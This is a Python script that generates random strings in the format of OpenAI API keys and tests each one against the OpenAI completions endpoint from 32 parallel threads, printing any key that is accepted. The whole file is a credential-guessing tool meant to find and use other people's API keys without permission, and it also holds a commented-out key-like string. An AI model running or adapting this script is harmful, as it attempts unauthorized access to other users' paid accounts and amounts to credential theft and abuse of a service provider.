import openai
import random
import threading
import time
# import string

def check():
    times = 1000
    def is_api_key_valid():
            try:
                response = openai.Completion.create(
                    engine="davinci",
                    prompt="This is a test.",
                    max_tokens=5
                )
            except:
                return False
            else:
                return True

    for r in range(times):
        # rk = "tVqE067MxmfAAPP68iuVT3BlbkFJkUz40UblcvyUUXrG3SO"
        # print(len(rk))
        symbols = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        rk = ''.join([random.choice(symbols) for n in range(47)])
        key = f"sk-{rk}"
        openai.api_key = key
        api_key_valid = is_api_key_valid()
        if api_key_valid:
            while True:
                print(key)
                time.sleep(1000)
    print(".")

st = time.time()
for i in range(1):
    t0 = threading.Thread(target=check, name=f"Thread-t0")
    t1 = threading.Thread(target=check, name=f"Thread-t1")
    t2 = threading.Thread(target=check, name=f"Thread-t2")
    t3 = threading.Thread(target=check, name=f"Thread-t3")
    t4 = threading.Thread(target=check, name=f"Thread-t4")
    t5 = threading.Thread(target=check, name=f"Thread-t5")
    t6 = threading.Thread(target=check, name=f"Thread-t6")
    t7 = threading.Thread(target=check, name=f"Thread-t7")

    tt0 = threading.Thread(target=check, name=f"Thread-tt0")
    tt1 = threading.Thread(target=check, name=f"Thread-tt1")
    tt2 = threading.Thread(target=check, name=f"Thread-tt2")
    tt3 = threading.Thread(target=check, name=f"Thread-tt3")
    tt4 = threading.Thread(target=check, name=f"Thread-tt4")
    tt5 = threading.Thread(target=check, name=f"Thread-tt5")
    tt6 = threading.Thread(target=check, name=f"Thread-tt6")
    tt7 = threading.Thread(target=check, name=f"Thread-tt7")

    ttt0 = threading.Thread(target=check, name=f"Thread-ttt0")
    ttt1 = threading.Thread(target=check, name=f"Thread-ttt1")
    ttt2 = threading.Thread(target=check, name=f"Thread-ttt2")
    ttt3 = threading.Thread(target=check, name=f"Thread-ttt3")
    ttt4 = threading.Thread(target=check, name=f"Thread-ttt4")
    ttt5 = threading.Thread(target=check, name=f"Thread-ttt5")
    ttt6 = threading.Thread(target=check, name=f"Thread-ttt6")
    ttt7 = threading.Thread(target=check, name=f"Thread-ttt7")

    tttt0 = threading.Thread(target=check, name=f"Thread-tttt0")
    tttt1 = threading.Thread(target=check, name=f"Thread-tttt1")
    tttt2 = threading.Thread(target=check, name=f"Thread-tttt2")
    tttt3 = threading.Thread(target=check, name=f"Thread-tttt3")
    tttt4 = threading.Thread(target=check, name=f"Thread-tttt4")
    tttt5 = threading.Thread(target=check, name=f"Thread-tttt5")
    tttt6 = threading.Thread(target=check, name=f"Thread-tttt6")
    tttt7 = threading.Thread(target=check, name=f"Thread-tttt7")

    t0.start()
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()
    t7.start()

    tt0.start()
    tt1.start()
    tt2.start()
    tt3.start()
    tt4.start()
    tt5.start()
    tt6.start()
    tt7.start()

    ttt0.start()
    ttt1.start()
    ttt2.start()
    ttt3.start()
    ttt4.start()
    ttt5.start()
    ttt6.start()
    ttt7.start()

    tttt0.start()
    tttt1.start()
    tttt2.start()
    tttt3.start()
    tttt4.start()
    tttt5.start()
    tttt6.start()
    tttt7.start()

    t0.join()
    t1.join()
    t2.join()
    t3.join()
    t4.join()
    t5.join()
    t6.join()
    t7.join()

    tt0.join()
    tt1.join()
    tt2.join()
    tt3.join()
    tt4.join()
    tt5.join()
    tt6.join()
    tt7.join()

    ttt0.join()
    ttt1.join()
    ttt2.join()
    ttt3.join()
    ttt4.join()
    ttt5.join()
    ttt6.join()
    ttt7.join()

    tttt0.join()
    tttt1.join()
    tttt2.join()
    tttt3.join()
    tttt4.join()
    tttt5.join()
    tttt6.join()
    tttt7.join()

    print(f"circle {i}: {time.time()-st}")
    st = time.time()